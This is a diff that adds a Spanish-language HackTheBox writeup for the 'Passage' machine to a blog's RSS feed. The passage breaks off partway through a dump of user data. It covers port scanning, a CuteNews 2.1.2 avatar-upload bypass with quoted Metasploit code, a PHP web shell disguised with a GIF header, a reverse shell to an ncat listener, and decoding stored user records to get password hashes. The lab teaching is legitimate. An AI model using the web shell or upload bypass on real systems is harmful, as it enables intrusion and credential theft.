@@ -1,13 +1,372 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Firtsmiracle blog</title>
-    <description>Articulos, Writeups y Noticias sobre Ciberseguridad</description>
+    <title>Firtsmiracle blog de Ciberseguridad</title>
+    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 11 Apr 2023 18:48:04 +0000</pubDate>
-    <lastBuildDate>Tue, 11 Apr 2023 18:48:04 +0000</lastBuildDate>
+    <pubDate>Mon, 17 Apr 2023 18:46:33 +0000</pubDate>
+    <lastBuildDate>Mon, 17 Apr 2023 18:46:33 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Passage - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Passage de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Cute News&lt;/code&gt;, haremos analisis de codigo para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de &lt;code&gt;USBCreator&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Passage
+❯ ls
+ Passage
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.206
+PING 10.10.10.206 (10.10.10.206) 56(84) bytes of data.
+64 bytes from 10.10.10.206: icmp_seq=1 ttl=63 time=210 ms
+
+--- 10.10.10.206 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 210.072/210.072/210.072/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.206 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:25 GMT
+Initiating SYN Stealth Scan at 16:25
+Scanning 10.10.10.206 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.206
+Discovered open port 80/tcp on 10.10.10.206
+Completed SYN Stealth Scan at 16:25, 16.83s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.206
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-04-17 16:25:13 GMT for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
+           Raw packets sent: 82801 (3.643MB) | Rcvd: 82648 (3.306MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;22 ssh&lt;/code&gt; , &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.206 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:27 GMT
+Nmap scan report for 10.10.10.206
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Passage News
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abiertos usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.206
+http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a &lt;code&gt;Cutenews&lt;/code&gt;, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.206 passage.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Visualizamos que existe una ruta de nombre &lt;code&gt;CuteNews&lt;/code&gt; y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de &lt;code&gt;CuteNews&lt;/code&gt; que se esta utilizando.&lt;/p&gt;
+
+&lt;p&gt;Verificamos si hay algun exploit publico &lt;code&gt;searchsploit&lt;/code&gt; y efectivamente existen vulnerabilidades asociadas a esta versión especifica &lt;code&gt;2.1.2&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cutenews 2.1.2
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                         | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                             | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                 | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                               | php/webapps/48800.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tenemos exploits que corresponden a &lt;code&gt;RCE&lt;/code&gt;, el primero de ellos nos habla de algo asociado con &lt;code&gt;avatar&lt;/code&gt;, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.&lt;/p&gt;
+
+&lt;p&gt;Vamos a proceder a registrarnos en el servicio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez registrados, obervamos en nuestro panel un campo correspondiente a &lt;code&gt;avatar&lt;/code&gt;, y si recordamos antes vimos un &lt;code&gt;exploit&lt;/code&gt; asociado que justamente nos hablaba de algo de &lt;code&gt;avatar&lt;/code&gt;. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la &lt;code&gt;RCE&lt;/code&gt; en el exploit la obtiene de un mal control en la subida de archivos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para estar seguros podemos examinar el exploit y ver que que trata.&lt;/p&gt;
+
+&lt;p&gt;Efectivamente dentro encontramos una función que lo que hace es realizar una petición en &lt;code&gt;avatar&lt;/code&gt; subiendo un arhivo &lt;code&gt;php&lt;/code&gt; que incluye una cabecera &lt;code&gt;GIF&lt;/code&gt; y de Content-Type &lt;code&gt;image/png&lt;/code&gt;: esto para mediante el uso de &lt;code&gt;Magic Numbers&lt;/code&gt; hacer un &lt;code&gt;bypass&lt;/code&gt; aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un &lt;code&gt;GIF&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;def upload_shell(cookie, check)
+
+    res = send_request_cgi({
+      'method'   =&amp;gt; 'GET',
+      'uri'      =&amp;gt; normalize_uri(target_uri.path, &quot;index.php?mod=main&amp;amp;opt=personal&quot;),
+      'cookie'   =&amp;gt; cookie
+    })
+
+    signkey = res.body.split('__signature_key&quot; value=&quot;')[1].split('&quot;')[0]
+    signdsi = res.body.split('__signature_dsi&quot; value=&quot;')[1].split('&quot;')[0]
+    # data preparation
+    fname = Rex::Text.rand_text_alpha_lower(8) + &quot;.php&quot;
+    @shell = &quot;#{fname}&quot;
+    pdata = Rex::MIME::Message.new
+    pdata.add_part('main', nil, nil, 'form-data; name=&quot;mod&quot;')
+    pdata.add_part('personal', nil, nil, 'form-data; name=&quot;opt&quot;')
+    pdata.add_part(&quot;#{signkey}&quot;, nil, nil, 'form-data; name=&quot;__signature_key&quot;')
+    pdata.add_part(&quot;#{signdsi}&quot;, nil, nil, 'form-data; name=&quot;__signature_dsi&quot;')
+    pdata.add_part('', nil, nil, 'form-data; name=&quot;editpassword&quot;')
+    pdata.add_part('', nil, nil, 'form-data; name=&quot;confirmpassword&quot;')
+    pdata.add_part(&quot;#{datastore['USERNAME']}&quot;, nil, nil, 'form-data; name=&quot;editnickname&quot;')
+    pdata.add_part(&quot;GIF\r\n&quot; + payload.encoded, 'image/png', nil, &quot;form-data; name=\&quot;avatar_file\&quot;; filename=\&quot;#{fname}\&quot;&quot;)
+    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[site]&quot;')
+    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[about]&quot;')
+    data = pdata.to_s
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Puedes ver este articulo, para comprender a mayor detalle el uso de &lt;code&gt;Magic Numbers&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;img src=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot; alt=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo &lt;code&gt;php&lt;/code&gt; con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido &lt;code&gt;cmd&lt;/code&gt; en conjunto con la función &lt;code&gt;shell_exec&lt;/code&gt;. Seguidamente subiremos el archivo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ cat cmd.php
+GIF8;
+
+&amp;lt;?php
+    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a la ruta indicada de nombre &lt;code&gt;uploads&lt;/code&gt; y si vemos nuestro archivo subido.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Verificamos que podemos ejecutar comandos y estamos como &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que sigue sera mandarnos una &lt;code&gt;reverse shell&lt;/code&gt; a nuestra maquina haciendo uso &lt;code&gt;bash&lt;/code&gt; y poniendonos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recordatorio no olvidar urlencodear el caracter &lt;code&gt;&amp;amp;&lt;/code&gt; a &lt;code&gt;%26&lt;/code&gt; para evitar problemas al procesarse la petición.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Enviamos la petición&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y recibimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.206.
+Ncat: Connection from 10.10.10.206:43080.
+bash: cannot set terminal process group (1683): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@passage:/var/www/html/CuteNews/uploads$ whoami
+whoami
+www-data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como es de costumbre, vamos a obtener una &lt;code&gt;tty&lt;/code&gt; full interactiva con los comandos de siempre.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
+www-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bash
+www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Cabe recordar que el numero de &lt;code&gt;rows&lt;/code&gt; y &lt;code&gt;columns&lt;/code&gt; corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando &lt;code&gt;stty size&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Existe un repositorio de &lt;code&gt;CuteNews&lt;/code&gt; publico en github:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;img src=&quot;https://github.com/CuteNews/cutenews-2.0&quot; alt=&quot;https://github.com/CuteNews/cutenews-2.0&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como &lt;code&gt;mysql&lt;/code&gt;. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre &lt;code&gt;cdata&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata$ ls 
+Default.tpl	    backup	 category.db.php  confirmations.php  idnews.db.php   news	 postponed_news.txt  template		  users.txt
+Headlines.tpl	    btree	 comments.txt	  csrf.php	     installed.mark  news.txt	 replaces.php	     unapproved_news.txt
+archives	    cache	 conf.php	  flood.db.php       ipban.db.php    newsid.txt  rss.tpl	     users
+auto_archive.db.php  cat.num.php  config.php	  flood.txt	     log	     plugins	 rss_config.php      users.db.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dentro de este directorio en el directorio &lt;code&gt;users&lt;/code&gt;, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del &lt;code&gt;usuario&lt;/code&gt; en &lt;code&gt;md5&lt;/code&gt; y le agrega la extensión &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Como yo cree el usuario &lt;code&gt;fmiracle&lt;/code&gt;, los primeros caracteres corresponderian a &lt;code&gt;cb&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo -n &quot;fmiracle&quot; | md5sum
+cb151a66aabded3ee89f616afab7b6c9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que si existe un archivo &lt;code&gt;cb.php&lt;/code&gt; en el directorio asi que procedemos a leerlo&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb.php 
+&amp;lt;?php die('Direct call - access denied'); ?&amp;gt;
+YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-d
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ya que el formato esta en &lt;code&gt;base64&lt;/code&gt; usaremos un &lt;code&gt;base64 -d&lt;/code&gt; para decodificarla y vemos el &lt;code&gt;hash&lt;/code&gt; correspondiente a la contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage&quot; | base64 -d; echo
+a:1:{s:4:&quot;name&quot;;a:1:{s:8:&quot;fmiracle&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1681750802&quot;;s:4:&quot;name&quot;;s:8:&quot;fmiracle&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:21:&quot;fmiracle@fmiracle.com&quot;;s:4:&quot;nick&quot;;s:8:&quot;fmiracle&quot;;s:4:&quot;pass&quot;;s:64:&quot;48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:6:&quot;avatar&quot;;s:23:&quot;avatar_fmiracle_cmd.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}
+                                          base64: invalid input
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a sus contraseñas&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v &quot;denied&quot; | base64 -d; echo
+a:1:{s:5:&quot;email&quot;;a:1:{s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598829833;s:6:&quot;egre55&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;egre55@test.com&quot;;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483281;s:9:&quot;sid-meier&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:17:&quot;nadav@passage.htb&quot;;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;kim@example.com&quot;;s:9:&quot;kim-swift&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483236;s:10:&quot;paul-coles&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485645&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483047;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;sid@example.com&quot;;s:9:&quot;sid-meier&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul 